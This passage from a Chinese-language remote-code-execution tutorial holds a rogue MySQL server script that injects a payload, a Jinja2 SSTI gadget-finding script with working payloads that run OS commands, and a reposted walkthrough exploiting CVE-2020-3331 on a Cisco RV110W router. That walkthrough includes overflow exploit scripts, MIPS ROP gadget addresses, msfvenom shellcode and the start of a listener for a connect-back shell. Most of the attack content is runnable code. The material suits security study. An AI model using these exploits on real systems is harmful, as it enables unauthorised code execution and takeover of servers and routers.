                    data = receive_data(conn)
                if "set character_set_results" in data:
                    send_data(conn,response_ok_data)
                    data = receive_data(conn)
                if "show session status" in data:
                    mysql_data = '0100000102'
                    mysql_data += '1a000002036465660001630163016301630c3f00ffff0000fc9000000000'
                    mysql_data += '1a000003036465660001630163016301630c3f00ffff0000fc9000000000'
                    # 为什么我加了EOF Packet 就无法正常运行呢？？
                    //获取payload
                    payload_content=get_payload_content()
                    //计算payload长度
                    payload_length = str(hex(len(payload_content)//2)).replace('0x', '').zfill(4)
                    payload_length_hex = payload_length[2:4] + payload_length[0:2]
                    //计算数据包长度
                    data_len = str(hex(len(payload_content)//2 + 4)).replace('0x', '').zfill(6)
                    data_len_hex = data_len[4:6] + data_len[2:4] + data_len[0:2]
                    mysql_data += data_len_hex + '04' + 'fbfc'+ payload_length_hex
                    mysql_data += str(payload_content)
                    mysql_data += '07000005fe000022000100'
                    send_data(conn, mysql_data)
                    data = receive_data(conn)
                if "show warnings" in data:
                    payload = '01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000'
                    send_data(conn, payload)
                break
    if __name__ == '__main__':
         HOST ='0.0.0.0'
         PORT = 3309
         sk = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
         #当socket关闭后，本地端用于该socket的端口号立刻就可以被重用.为了实验的时候不用等待很长时间
         sk.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1)
         sk.bind((HOST, PORT))
         sk.listen(1)
         print("start fake mysql server listening on {}:{}".format(HOST,PORT))
         run()
## **14 SSTI注入**
除了这些还有一种rce非常的少见，就是ssti注入到rce
简单demo
我们可以看到计算成功，那么就证明这个点是存在ssti注入的
用网上的脚本跑一下payload
    from flask import Flask
    from jinja2 import Template
    searchList = ['__init__', "__new__", '__del__', '__repr__', '__str__','__bytes__', '__format__', '__lt__', '__le__', '__eq__', '__ne__', '__gt__','__ge__', '__hash__', '__bool__', '__getattr__', '__getattribute__','__setattr__', '__dir__', '__delattr__', '__get__', '__set__', '__delete__','__call__', "__instancecheck__", '__subclasscheck__', '__len__','__length_hint__', '__missing__','__getitem__', '__setitem__','__iter__','__delitem__', '__reversed__', '__contains__', '__add__','__sub__','__mul__']
    neededFunction = ['eval', 'open', 'exec']
    pay = int(input("Payload?[1|0]"))
    for index, i in enumerate({}.__class__.__base__.__subclasses__()):
         for attr in searchList:
              if hasattr(i, attr):
                  if eval('str(i.'+attr+')[1:9]') == 'function':
                      for goal in neededFunction:
                          if (eval('"'+goal+'" in i.'+attr+'.__globals__["__builtins__"].keys()')):
                             if pay != 1:
                                  print(i.__name__,":", attr, goal)
                             else:
                                  print("{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='" + i.__name__ + "' %}{{ c." + attr + ".__globals__['__builtins__']." + goal + "(\"[evil]\")}}{% endif %}{% endfor %}")
我们从output里随便抽一个payload
例如第一行这个
    {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='_ModuleLock' %}{{c.__init__.__globals__['__builtins__'].eval("print('ZACTEST')") }}{%endif %}{% endfor %}
然后打开我们的web服务，就是最开始的demo
打进去payload，我们可以看到成功print输出ZACTEST
使用os模块执行whoami
    http://127.0.0.1:5000/?name={%for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()")}}{% endif %}{% endfor %}
## **15 缓冲区溢出**
因为我并不是玩pwn的，所以对缓冲区溢出RCE几乎完全不懂，以下就直接把大佬文章搬过来（已经得到授权）原文链接出处：
https://ret2w1cky.com/2021/11/12/RV110W%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/
假设我们已经通过类似固件解包，串口通信等方法获取了路由器的固件等我们可以尝试通过寻找已知的CVE来定位可能的rce,这里是寻找到了CVE-2020-3331这个漏洞。
由于并没有对于漏洞点的一个精确定位 我们现在要一点一点的摸索；首先，在上面的Nmap
扫描中，我们知道网站是开放了443端口的。因此，上内部服务器之后netstat确定文件是最好的方式了。但是，因为某一些原因，其中的netstst命令可能因为版本过低没有办法使用一些参数，所以，我决定开个http服务器，把高等级的busybox传上去
可以看到，443端口绑定的正是httpd文件，现在我们已经可以确定漏洞文件了，现在只需要查找漏洞的函数了
这时候，我们就可以使用diff查找也就是查找两个文件不同的地方，我们使用Bindiff工具, 现在，我们解包新版本的和旧版本进行比对：
这里 可以说越红就代表差异越大 但是 你越往下看就会发现唯一这个guest_logout_cgi和web有点关系 右键这个函数 View flow
graph
嗯 随便一看就可以看到这里有个高风险函数`sscanf` 地址在`0x431ba8`
其中sscanf的条件"%[^;];% _[^=]=%[^\n]"里，% 表示选择，%_ 表示过滤，中括号括起来的是类似正则
%[^;]：分号前的所有字符都要
%*[^=]：分号后，等号前的字符都不要
%[^\n]：等号后，换行符前的所有字符都要
也就是说，如果输入字符串”aaa;bbb=ccc”，会将aaa和ccc写入对应变量，并没有限制长度，会导致栈溢出
找到了这段代码 我们现在要对伪代码进行分析 看看需要达到那些分支才能达到`sscanf函数`
通过查阅函数 可以知道我们需要让...
  * cmac：mac格式
  * cip：ip格式
  * submit_button：包含status_guestnet.asp
现在知道了页面是`/guest_logout.cgi`了 需要达成这些条件 那么 我们就可以开始试图溢出了 exp如下 ：
    import requests
    url = "https://192.168.1.1/guest_logout.cgi"
    payload = {"cmac":"12:af:aa:bb:cc:dd","submit_button":"status_guestnet.asp"+'a'*100,"cip":"192.168.1.100"}
其中 我们还需要确定是用get 还是 post进行攻击 具体还是自己试一试吧 最后会发现只有post攻击下 web后台会转圈圈 所以可以确定是
post攻击方法
gdb-server 我们内部使用
https://gitee.com/h4lo1/HatLab_Tools_Library/tree/master/%E9%9D%99%E6%80%81%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%A8%
使用wget 下载到 /tmp目录 通过上一次的`netstat`扫描 确定进程号 并且绑定进程号 格式如下:
./gdb.server : \--attach 
在exp上 我利用cyclic脚本来确定溢出点
exp如下：
    import requests
    import requests
    payload = 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
    #(cyclic 200)
    url = "https://10.10.10.1/guest_logout.cgi"
    payload = {"cmac":"12:af:aa:bb:cc:dd","submit_button":"status_guestnet.asp"+payload,"cip":"192.168.1.100"}
    requests.packages.urllib3.disable_warnings()
    requests.post(url, data=payload, verify=False, timeout=1)
打开gdb multiarch 这样设置
#(记得按c)
发送exp后 成功 确定了溢出点为 aaaw 通过 cyclic -l 查询 发现为85
现在 我们就可以准备构造语句了
**ROP Get shell**
mips架构硬件并不支持nx，所以利用方式通常为劫持程序流执行shellcode
由于sscanf栈溢出，所以不能有空字节，而程序本身的gadget都是有空字节的。。。
这时候自然想到用libc的gadget，但是，比较诡异的一点是，它的libc基址每次都不变
这里 我们可以通过`cat /proc//maps`查看
所以 我们就要通过ret2libc的方式getshell 我们选择/lib/libc.so.0
利用mipsgadget 发现两条有用的gadgets
| 0x000257A0 | addiu sp,0x58+var_40 | jalr $s0 |
| 0x0003D050 | move a0 | jalr $a0 |
这样会造成什么效果呢？程序返回时，程序执行流被控制为0x257a0，去执行第一条gadget，a0 = sp +
0x18，jmp到s0寄存器，s0寄存器存的是第二条gadget，继而去执行第二条gadget，将a0放到t9，然后jmp到a0，a0存的是shellcode的地址，于是程序就会执行shellcode
**Shellcode**
我们shellcode用 msfvenom 不会生产空字节
那么小伙伴可能要问了 _那s0寄存器地址怎么算呢？_
其实 只要用我们第一次算溢出的图用 cyclic算就行了 也就是`cyclic -l aaan`
Exp:
    import requests
    from pwn import *
    p = listen(8788)
    context.arch = 'mips'